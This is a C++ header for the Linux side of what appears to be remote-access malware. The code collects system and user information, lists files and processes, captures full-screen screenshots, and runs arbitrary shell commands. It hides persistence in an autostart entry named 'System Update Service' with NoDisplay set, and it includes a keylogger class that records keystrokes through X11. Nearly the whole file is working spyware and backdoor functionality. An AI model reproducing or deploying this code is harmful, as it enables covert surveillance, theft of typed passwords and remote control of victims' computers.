#ifndef PLATFORM_LINUX_H
#define PLATFORM_LINUX_H

#if defined(__linux__) || defined(__unix__)

#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <sys/types.h>
#include <pwd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <errno.h>
#include <vector>
#include <string>
#include <cstring>
#include <memory>
#include <sstream>
#include <iostream>
#include <fstream>

namespace Platform
{
    // Socket API compatibility layer
    inline void initializeNetworking()
    {
        // Not needed on Linux
    }

    inline void cleanupNetworking()
    {
        // Not needed on Linux
    }

    inline int getLastSocketError()
    {
        return errno;
    }

    inline void closeSocket(int socketfd)
    {
        close(socketfd);
    }

    // System information
    inline std::string getHostname()
    {
        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) == 0)
        {
            return std::string(hostname);
        }
        return "Unknown";
    }

    inline std::string getUsername()
    {
        struct passwd *pw = getpwuid(getuid());
        if (pw)
        {
            return std::string(pw->pw_name);
        }
        return "Unknown";
    }

    inline std::string getOSInfo()
    {
        struct utsname buffer;
        if (uname(&buffer) != 0)
        {
            return "Linux (Unknown Version)";
        }
        
        return std::string(buffer.sysname) + " " + buffer.release + " " + buffer.machine;
    }

    // File operations
    inline std::string getCurrentDirectory()
    {
        char path[PATH_MAX];
        if (getcwd(path, sizeof(path)) != NULL)
        {
            return std::string(path);
        }
        return ".";
    }

    inline std::vector<std::pair<std::string, bool>> listDirectory(const std::string &path)
    {
        std::vector<std::pair<std::string, bool>> result;
        DIR *dir = opendir(path.c_str());
        
        if (dir)
        {
            struct dirent *entry;
            while ((entry = readdir(dir)) != NULL)
            {
                std::string filename = entry->d_name;
                if (filename != "." && filename != "..")
                {
                    struct stat statbuf;
                    std::string fullPath = path + "/" + filename;
                    if (stat(fullPath.c_str(), &statbuf) == 0)
                    {
                        bool isDirectory = S_ISDIR(statbuf.st_mode);
                        result.push_back(std::make_pair(filename, isDirectory));
                    }
                }
            }
            closedir(dir);
        }
        return result;
    }

    // Screenshot functionality
    inline std::vector<uint8_t> captureScreenshot()
    {
        std::vector<uint8_t> imageData;
        
        // Open X display
        Display* display = XOpenDisplay(NULL);
        if (!display)
        {
            return imageData;
        }
        
        // Get default screen and root window
        int screen = DefaultScreen(display);
        Window root = RootWindow(display, screen);
        
        // Get screen dimensions
        XWindowAttributes gwa;
        XGetWindowAttributes(display, root, &gwa);
        int width = gwa.width;
        int height = gwa.height;
        
        // Create XImage
        XImage *image = XGetImage(display, root, 0, 0, width, height, AllPlanes, ZPixmap);
        if (!image)
        {
            XCloseDisplay(display);
            return imageData;
        }
        
        // Save to PPM format in memory (simpler than PNG for demonstration)
        std::stringstream ss;
        ss << "P6\n" << width << " " << height << "\n255\n";
        
        for (int y = 0; y < height; y++)
        {
            for (int x = 0; x < width; x++)
            {
                unsigned long pixel = XGetPixel(image, x, y);
                
                // Extract RGB
                unsigned char blue = pixel & 0xff;
                unsigned char green = (pixel >> 8) & 0xff;
                unsigned char red = (pixel >> 16) & 0xff;
                
                ss.put(red);
                ss.put(green);
                ss.put(blue);
            }
        }
        
        // Clean up X resources
        XDestroyImage(image);
        XCloseDisplay(display);
        
        // Convert to bytes
        std::string str = ss.str();
        imageData.assign(str.begin(), str.end());
        
        return imageData;
    }

    // Process management
    inline std::vector<std::pair<pid_t, std::string>> getProcessList()
    {
        std::vector<std::pair<pid_t, std::string>> processes;
        
        DIR* proc_dir = opendir("/proc");
        if (!proc_dir)
        {
            return processes;
        }
        
        struct dirent* entry;
        while ((entry = readdir(proc_dir)) != NULL)
        {
            // Check if the directory entry is a PID (numeric)
            if (entry->d_type == DT_DIR)
            {
                char* endptr;
                pid_t pid = strtol(entry->d_name, &endptr, 10);
                
                if (*endptr == '\0') // Valid number
                {
                    std::string cmdline_path = "/proc/" + std::string(entry->d_name) + "/cmdline";
                    std::ifstream cmdline_file(cmdline_path);
                    
                    if (cmdline_file.is_open())
                    {
                        std::string cmdline;
                        std::getline(cmdline_file, cmdline);
                        
                        // Extract process name
                        size_t pos = cmdline.find('\0');
                        if (pos != std::string::npos)
                        {
                            cmdline = cmdline.substr(0, pos);
                        }
                        
                        // Extract just the executable name
                        pos = cmdline.find_last_of('/');
                        if (pos != std::string::npos)
                        {
                            cmdline = cmdline.substr(pos + 1);
                        }
                        
                        if (!cmdline.empty())
                        {
                            processes.push_back(std::make_pair(pid, cmdline));
                        }
                    }
                }
            }
        }
        
        closedir(proc_dir);
        return processes;
    }

    inline bool killProcess(pid_t pid)
    {
        return (kill(pid, SIGTERM) == 0);
    }

    // Persistence
    inline bool installPersistence(const std::string &executablePath)
    {
        // Create autostart entry in user's home directory
        const char* home = getenv("HOME");
        if (!home)
        {
            return false;
        }
        
        // Create autostart directory if it doesn't exist
        std::string autostartDir = std::string(home) + "/.config/autostart";
        mkdir(autostartDir.c_str(), 0755);
        
        // Create desktop entry file
        std::string desktopFilePath = autostartDir + "/system-update.desktop";
        std::ofstream desktopFile(desktopFilePath);
        
        if (desktopFile.is_open())
        {
            desktopFile << "[Desktop Entry]\n";
            desktopFile << "Type=Application\n";
            desktopFile << "Name=System Update Service\n";
            desktopFile << "Exec=" << executablePath << "\n";
            desktopFile << "Hidden=false\n";
            desktopFile << "NoDisplay=true\n";
            desktopFile << "X-GNOME-Autostart-enabled=true\n";
            desktopFile.close();
            
            // Set permissions
            chmod(desktopFilePath.c_str(), 0755);
            return true;
        }
        
        return false;
    }

    inline bool removePersistence()
    {
        const char* home = getenv("HOME");
        if (!home)
        {
            return false;
        }
        
        std::string desktopFilePath = std::string(home) + "/.config/autostart/system-update.desktop";
        return (unlink(desktopFilePath.c_str()) == 0 || errno == ENOENT);
    }

    // Shell execution
    inline std::string executeCommand(const std::string &command)
    {
        std::string result;
        int pipes[2];
        
        if (pipe(pipes) == -1)
        {
            return "Error creating pipe";
        }
        
        pid_t pid = fork();
        
        if (pid == -1)
        {
            close(pipes[0]);
            close(pipes[1]);
            return "Error forking process";
        }
        
        if (pid == 0) // Child process
        {
            close(pipes[0]); // Close read end
            dup2(pipes[1], STDOUT_FILENO); // Redirect stdout
            dup2(pipes[1], STDERR_FILENO); // Redirect stderr
            close(pipes[1]);
            
            execl("/bin/sh", "sh", "-c", command.c_str(), NULL);
            exit(EXIT_FAILURE); // Only reached if exec fails
        }
        else // Parent process
        {
            close(pipes[1]); // Close write end
            
            char buffer[4096];
            ssize_t bytesRead;
            
            while ((bytesRead = read(pipes[0], buffer, sizeof(buffer) - 1)) > 0)
            {
                buffer[bytesRead] = '\0';
                result += buffer;
            }
            
            close(pipes[0]);
            waitpid(pid, NULL, 0);
        }
        
        return result;
    }

    // Keylogger functionality for Linux (requires X11)
    class Keylogger
    {
    private:
        static Display* display;
        static std::string logBuffer;
        static bool isRunning;
        static pthread_t loggingThread;
        
        static void* loggingFunction(void* arg)
        {
            while (isRunning)
            {
                if (display)
                {
                    char keys_return[32];
                    XQueryKeymap(display, keys_return);
                    
                    for (int i = 0; i < 256; i++)
                    {
                        if (keys_return[i/8] & (1 << (i % 8)))
                        {
                            // Get key name
                            KeySym keysym = XkbKeycodeToKeysym(display, i, 0, 0);
                            char* keyname = XKeysymToString(keysym);
                            
                            if (keyname && strlen(keyname) > 0)
                            {
                                if (strlen(keyname) > 1)
                                {
                                    logBuffer += "[" + std::string(keyname) + "]";
                                }
                                else
                                {
                                    logBuffer += keyname;
                                }
                            }
                        }
                    }
                }
                usleep(100000); // 100ms polling rate
            }
            
            return NULL;
        }
        
    public:
        static bool start()
        {
            if (isRunning)
                return true;
                
            display = XOpenDisplay(NULL);
            if (!display)
                return false;
                
            isRunning = true;
            logBuffer.clear();
            
            // Start logging thread
            if (pthread_create(&loggingThread, NULL, loggingFunction, NULL) != 0)
            {
                isRunning = false;
                XCloseDisplay(display);
                display = NULL;
                return false;
            }
            
            return true;
        }
        
        static bool stop()
        {
            if (!isRunning)
                return true;
                
            isRunning = false;
            
            // Wait for thread to finish
            pthread_join(loggingThread, NULL);
            
            // Close X display
            if (display)
            {
                XCloseDisplay(display);
                display = NULL;
            }
            
            return true;
        }
        
        static std::string dump()
        {
            std::string result = logBuffer;
            logBuffer.clear();
            return result;
        }
    };

    // Static member initialization
    Display* Keylogger::display = NULL;
    std::string Keylogger::logBuffer = "";
    bool Keylogger::isRunning = false;
    pthread_t Keylogger::loggingThread;
};

#endif // defined(__linux__) || defined(__unix__)
#endif // PLATFORM_LINUX_H 